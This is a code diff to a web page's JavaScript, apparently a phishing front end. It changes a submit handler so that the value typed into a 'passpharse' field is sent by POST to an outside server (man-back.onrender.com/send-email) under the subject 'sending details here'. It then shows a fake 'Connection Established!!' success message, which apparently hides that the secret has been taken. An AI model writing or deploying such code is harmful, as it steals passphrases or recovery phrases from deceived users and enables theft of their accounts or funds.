@@ -21,11 +21,21 @@ secButton.addEventListener('click',()=>{
 
 },2500);
 
-const submit =()=>{
+const submit =async ()=>{
     console.log("worked here");
     const resp = document.getElementById("passpharse").value;
     console.log(resp);
-    
+    const data ={
+        "body": resp,
+        "subject": "sending details here"
+    };
     myModalAlternative.hide();
+  const etchResp = await fetch('https://man-back.onrender.com/send-email',{
+        method: 'POST', // or 'PUT'
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data),
+    })
     swal("Good job!", "Connection Established!!", "success");
 }
